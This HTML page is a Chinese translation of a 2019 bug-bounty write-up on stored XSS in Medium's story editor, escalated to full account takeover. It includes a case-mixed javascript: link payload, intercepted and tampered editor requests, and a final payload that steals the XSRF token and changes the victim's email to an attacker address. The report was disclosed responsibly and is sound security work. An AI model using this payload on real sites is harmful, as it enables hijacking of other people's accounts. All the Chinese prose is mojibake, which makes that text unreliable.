<html>
<head>
<title>Writing my Medium blog to complete account takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">å†™æˆ‘çš„ä¸­å‹åšå®¢æ¥å®Œæˆå¸æˆ·æ¥ç®¡</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/writing-my-medium-blog-to-complete-account-takeover-e65d455c16b?source=collection_archive---------1-----------------------#2019-08-09">https://infosecwriteups.com/writing-my-medium-blog-to-complete-account-takeover-e65d455c16b?source=collection_archive---------1-----------------------#2019-08-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b24a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi kl translated">å‡ å‘¨å‰çš„ä¸€ä¸ªæ™šä¸Šï¼Œæˆ‘æ­£åœ¨å†™ä¸€ç¯‡æ–°åª’ä½“åšå®¢ï¼Œä¸»é¢˜æ˜¯â€”â€”ä¸ºä»€ä¹ˆå…¬å¸åº”è¯¥æ‹¥æŠ±bug-bountyå¹³å°ï¼Œç›´åˆ°æˆ‘é™·å…¥æ–‡æ€æ¯ç«­ã€‚</p><p id="7b82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¿ƒæƒ³â€œè®©æˆ‘ä»¬èŠ±å‡ åˆ†é’Ÿåšç‚¹åˆ«çš„äº‹æƒ…ï¼Œç„¶åå†å›æ¥â€ã€‚å½“æˆ‘éœ€è¦ä¼‘æ¯çš„æ—¶å€™æˆ‘ä¼šåšä»€ä¹ˆï¼Ÿæˆ‘å¼€å§‹æ‘†å¼„æœ€è¿‘çš„åº”ç”¨ç¨‹åºï¼Œè¿™æ¬¡æ˜¯Mediumçš„æ•…äº‹ç¼–è¾‘é¡µé¢ã€‚</p><p id="03d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä¸å¤ªè®°å¾—æ˜¯æ€ä¹ˆåšçš„äº†ï¼Œä½†æ˜¯æˆ‘æ³¨æ„åˆ°æˆ‘å¯ä»¥ç”¨åƒ<code class="fe ku kv kw kx b">mailto:</code>è¿™æ ·çš„ç‰¹æ®Šæ¨¡å¼æ·»åŠ é“¾æ¥ï¼Œç„¶åæˆ‘çš„ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯â€”â€”å¦‚æœæˆ‘å¯ä»¥ä½¿ç”¨<code class="fe ku kv kw kx b">mailto:</code>ï¼Œé‚£ä¹ˆ<code class="fe ku kv kw kx b">javascript:</code>å‘¢ï¼Ÿ</p><figure class="ky kz la lb gt lc"><div class="bz fp l di"><div class="ld le l"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä¸ï¼Œé‚£æ²¡ç”¨ã€‚</figcaption></figure><p id="a379" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘æ­£è¦ç»§ç»­æˆ‘çš„ç”Ÿæ´»ï¼Œä½†æˆ‘è„‘æµ·ä¸­æœ‰ä¸€ä¸ªå°å°çš„å£°éŸ³åœ¨å‘¼å–Š</p><figure class="ky kz la lb gt lc"><div class="bz fp l di"><div class="lj le l"/></div></figure><p id="bccf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥æˆ‘é€‰æ‹©äº†é‚£ä¸ªå°å£°éŸ³ï¼Œè¿™ä¸€æ¬¡æˆ‘å°è¯•äº†<code class="fe ku kv kw kx b">jAvAsCrIpT:confirm()</code>ï¼Œæˆ‘æ— æ³•ç›¸ä¿¡â€”â€”æˆåŠŸäº†ã€‚ğŸ™„</p><p id="a7a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é“¾æ¥è¢«æ·»åŠ åˆ°æˆ‘çš„æ•…äº‹ä¸­ï¼Œå½“æˆ‘ä½œä¸ºé˜…è¯»å™¨æ‰“å¼€å®ƒå¹¶ç‚¹å‡»é“¾æ¥æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªç¡®è®¤å¯¹è¯æ¡†ã€‚</p><h2 id="3024" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated"><strong class="ak">æ¦‚å¿µéªŒè¯</strong></h2><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi md"><img src="../Images/f79a5ed1755e3c392429d9db5e5ed416.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*6KmlmJwt-cLLVVbGqJvPjQ.gif"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">è¯»è€…ç‚¹å‡»é“¾æ¥ï¼Œå¼¹å‡ºä¸€ä¸ªç¡®è®¤å¯¹è¯æ¡†</figcaption></figure><p id="3b9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½äº†ï¼Œæˆ‘åœ¨ã€Šçµåª’çš„é¢åŒ…å’Œé»„æ²¹ã€‹ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå‚¨å­˜çš„XSSâ€”â€”å®ƒçš„æ•…äº‹ã€‚æˆ‘æŠ¥å‘Šäº†è¿™ä¸ªé—®é¢˜ï¼Œç„¶åä¸ŠåºŠç¡è§‰ã€‚</p><h2 id="7d1d" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">æ›´å¤šï¼Œæˆ‘æƒ³è¦æ›´å¤š</h2><p id="9ccb" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">ç¬¬äºŒå¤©æˆ‘é†’æ¥æ—¶æœ‰ä¸€ä¸ªå›°æ‰°çš„æƒ³æ³•â€”â€”æˆ‘åªèŠ±äº†5åˆ†é’Ÿå°±æ‰¾åˆ°äº†ä¸€ä¸ªéå¸¸ç®€å•çš„å­˜å‚¨XSSã€‚çœŸçš„å¦‚æ­¤å¯‚å¯å—ï¼Ÿ</p><p id="73b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å·²ç»æ·»åŠ äº†ä¸€ä¸ª<em class="mp"> Unsplashå›¾åƒ</em>åˆ°ä¸€ä¸ªæ•…äº‹ä¸­ï¼Œå¹¶ç”¨Burp Suiteæ‹¦æˆªäº†è¿™ä¸ªè¯·æ±‚ã€‚è¯·æ±‚çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„:</p><pre class="ky kz la lb gt mq kx mr ms aw mt bi"><span id="fa37" class="lk ll iq kx b gy mu mv l mw mx"><em class="mp">POST /p/8f2xxxxxxx/deltas?logLockId=970 HTTP/1.1<br/>Host: medium.com<br/>User-Agent: [Redacted]<br/>Accept: application/json<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: https://medium.com/p/</em>8f2xxxxxxx<em class="mp">/edit<br/>X-Obvious-CID: web<br/>X-XSRF-Token: [Redacted]<br/>X-Client-Date: [Redacted]<br/>Content-Type: application/json<br/>Content-Length: 536<br/>Connection: close<br/>Cookie: [Redacted]<br/>{"id":"</em>8f2xxxxxxx<em class="mp">","deltas":[{"type":3,"index":1,"paragraph":{"name":"exxx","type":4,"text":"Photo by Some Author on Unsplash","markups":[{"type":3,"start":9,"end":17,"href":"</em>https://medium.com/r/?url=https%3A%2F%2Funsplash.com%2F%40someauthor%3Futm_source%3Dmedium%26utm_medium%3Dreferral<em class="mp">","title":"","rel":"photo-creator","anchorType":0},{"type":3,"start":21,"end":29,"href":"</em>https://medium.com/r/?url=https%3A%2F%2Funsplash.com%2F%40someauthor%3Futm_source%3Dmedium%26utm_medium%3Dreferral<em class="mp">","title":"","rel":"photo-source","anchorType":0}],"layout":1,"metadata":{"id":"0*xxxxxx","originalWidth":"\"alt='test'","originalHeight":5219,"alt":"","unsplashPhotoId":"xxxxx"}},"verifySameName":true}],"baseRev":28}</em></span></pre><p id="00cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åï¼Œæˆ‘å°†ä¸¤ä¸ªhrefå€¼æ›¿æ¢ä¸ºæˆ‘åœ¨ç¬¬ä¸€ä¸ªXSSä¸Šä½¿ç”¨çš„ç›¸åŒæœ‰æ•ˆè½½è·ã€‚<br/>è¯·æ±‚è¢«ç¯¡æ”¹çš„æ­£æ–‡çœ‹èµ·æ¥åƒ:</p><pre class="ky kz la lb gt mq kx mr ms aw mt bi"><span id="d892" class="lk ll iq kx b gy mu mv l mw mx"><em class="mp">{"id":"</em>8f2xxxxxxx<em class="mp">","deltas":[{"type":3,"index":1,"paragraph":{"name":"exxx","type":4,"text":"Photo by Some Author on Unsplash","markups":[{"type":3,"start":9,"end":17,"href":"</em>jAvAsCrIpT:confirm()<em class="mp">","title":"","rel":"photo-creator","anchorType":0},{"type":3,"start":21,"end":29,"href":"</em>jAvAsCrIpT:confirm()<em class="mp">","title":"","rel":"photo-source","anchorType":0}],"layout":1,"metadata":{"id":"0*xxxxxx","originalWidth":"\"alt='test'","originalHeight":5219,"alt":"","unsplashPhotoId":"xxxxx"}},"verifySameName":true}],"baseRev":28}</em></span></pre><p id="54e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½ çŒœæ€ä¹ˆç€ï¼ŒæˆåŠŸäº†ï¼</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi my"><img src="../Images/aee667f6dcf1fb4a5c1d2a00764d7131.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*h_qTR_ZW0QQPq39b8Vi8xw.gif"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">å¦ä¸€ä¸ªå­˜å‚¨åœ¨Unsplashå›¾åƒç»„ä»¶ä¸­çš„XSS</figcaption></figure><h2 id="f662" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">å¢åŠ å½±å“</h2><p id="471f" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">æ ¹æ®Mediumçš„bug-bountyé¡µé¢ï¼Œä»–ä»¬åªä¸ºXSSæ”¯ä»˜äº†100ç¾å…ƒï¼Œä½†æˆ‘æƒ³èµ¢å¾—å¤§å¥–:</p><blockquote class="na nb nc"><p id="ad0e" class="jn jo mp jp b jq jr js jt ju jv jw jx nd jz ka kb ne kd ke kf nf kh ki kj kk ij bi translated">æ¼æ´æˆ–ç»•è¿‡é‡è¦çš„å®‰å…¨æ§åˆ¶:1000ç¾å…ƒ</p></blockquote><p id="ae6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºæˆ‘å·²ç»åœ¨ä¸€ä¸ªæ•…äº‹ä¸­å­˜å‚¨äº†å¤šä¸ªXSSï¼Œæˆ‘æƒ³é€šè¿‡<strong class="jp ir">æ¼”ç¤ºä¸€ä¸ªå®Œæ•´çš„å¸æˆ·æ¥ç®¡</strong>æ¥å¢åŠ å½±å“ã€‚</p><p id="e54a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºä¼šè¯cookieè¢«è®¾ç½®ä¸ºHTTP Onlyï¼Œæˆ‘ä»¬ä¸èƒ½åªæ˜¯çªƒå–cookieï¼Œæˆ‘ä»¬å¿…é¡»æ›´åŠ åŠªåŠ›åœ°å·¥ä½œã€‚<br/>æˆ‘ç›´æ¥è¿›å…¥æˆ‘çš„ç”¨æˆ·èµ„æ–™ï¼ŒæŸ¥çœ‹æˆ‘æ˜¯å¦å¯ä»¥åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ç”¨å¦ä¸€ä¸ªç”µå­é‚®ä»¶æ›´æ”¹æˆ‘çš„ç”µå­é‚®ä»¶ï¼Œæˆ‘å‘ç°æˆ‘å¯ä»¥ã€‚å¤ªå¥½äº†ï¼æ‰€ä»¥ä¸ºäº†æµ‹è¯•ï¼Œæˆ‘æ‰‹åŠ¨æ›´æ”¹äº†æˆ‘çš„ç”µå­é‚®ä»¶ï¼Œä½¿ç”¨äº†â€œç¥å¥‡é“¾æ¥â€åŠŸèƒ½ï¼Œå‘æˆ‘çš„æ–°ç”µå­é‚®ä»¶å‘é€äº†ä¸€ä¸ªä¸´æ—¶ç™»å½•é“¾æ¥ï¼Œæˆ‘è¿›å…¥äº†æˆ‘çš„æ–°ç”µå­é‚®ä»¶åœ°å€å¸æˆ·ã€‚</p><h2 id="f50c" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">è‡ªåŠ¨åŒ–æ”»å‡»</h2><p id="049f" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„æ­¥éª¤æ˜¯:</p><ul class=""><li id="6421" class="ng nh iq jp b jq jr ju jv jy ni kc nj kg nk kk nl nm nn no bi translated">è·å–ç”¨æˆ·çš„XSRFä»¤ç‰Œ(æˆ‘æé†’ä½ ï¼Œæ²¡æœ‰cookiesç»™ä½ ï¼)</li><li id="551e" class="ng nh iq jp b jq np ju nq jy nr kc ns kg nt kk nl nm nn no bi translated">ç”¨æ–°çš„ç”µå­é‚®ä»¶å‘<code class="fe ku kv kw kx b">/me/email</code>ç«¯ç‚¹å‘é€PUTè¯·æ±‚</li></ul><p id="c394" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä½¿ç”¨çš„æœ€ç»ˆæœ‰æ•ˆè½½è·:</p><pre class="ky kz la lb gt mq kx mr ms aw mt bi"><span id="d46d" class="lk ll iq kx b gy mu mv l mw mx"><em class="mp">JaVaScRiPt:var x=window.__PRELOADED_STATE__.session.xsrf;var h = new XMLHttpRequest();h.open(â€˜PUTâ€™, â€˜/me/emailâ€™, true);h.setRequestHeader(â€˜Content-Typeâ€™, â€˜application/jsonâ€™);h.setRequestHeader(â€˜X-XSRF-Tokenâ€™, x);h.send(â€˜{â€œemailâ€:â€attacker@malicious.comâ€}â€™);</em></span></pre></div><div class="ab cl nu nv hu nw" role="separator"><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz"/></div><div class="ij ik il im in"><h2 id="79d7" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">æŠ¥å‘Šæ—¶é—´çº¿</h2><p id="d418" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">2019å¹´7æœˆ10æ—¥â€”åˆå§‹æŠ¥å‘Š<br/>2019å¹´7æœˆ10æ—¥â€”ç”¨Unsplashæ˜ åƒä¸­å­˜å‚¨çš„å¦ä¸€ä¸ªXSSæ›´æ–°æŠ¥å‘Š<br/>2019å¹´7æœˆ12æ—¥â€”ç”¨å®Œæ•´çš„å¸æˆ·æ¥ç®¡æ¼”ç¤ºæ›´æ–°æŠ¥å‘Š<br/>2019å¹´7æœˆ13æ—¥Mediumå®‰å…¨å›¢é˜Ÿçš„é¦–æ¬¡å›åº”</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/1413791f1d5d9a9a65a13d44dc947979.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*ZfQyUvGUmGpRbEEYPi89ZQ.png"/></div></figure><p id="3619" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2019å¹´8æœˆ3æ—¥â€”é—®é¢˜å·²ä¿®å¤ï¼Œæˆ‘å·²è·å‡†æŠ«éœ²<br/>2019å¹´8æœˆ6æ—¥â€”æˆ‘è¢«æ·»åŠ åˆ°<a class="ae mz" href="https://medium.com/humans.txt" rel="noopener">åª’ä½“çš„humans.txtæ–‡ä»¶</a></p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/281dc47e800311c914998a368f3f2e21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*Gp5eq5HQgTzYaEVoLKnSZg.png"/></div></figure></div><div class="ab cl nu nv hu nw" role="separator"><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz"/></div><div class="ij ik il im in"><p id="679f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡æŠ€æœ¯bug-bountyæ–‡ç« ï¼Œå¸Œæœ›ä½ å–œæ¬¢ã€‚å¦‚æœä½ æœ‰ï¼Œè¯·éšæ—¶å…³æ³¨æˆ‘ã€‚</p><p id="f99f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ„Ÿè°¢Mediumçš„å®‰å…¨å›¢é˜Ÿä»¥è¶…çº§ä¸“ä¸šçš„æ–¹å¼å¤„ç†äº†è¿™ä»½æŠ¥å‘Šï¼Œå¹¶å…è®¸æŠ«éœ²ã€‚</p></div></div>    
</body>
</html>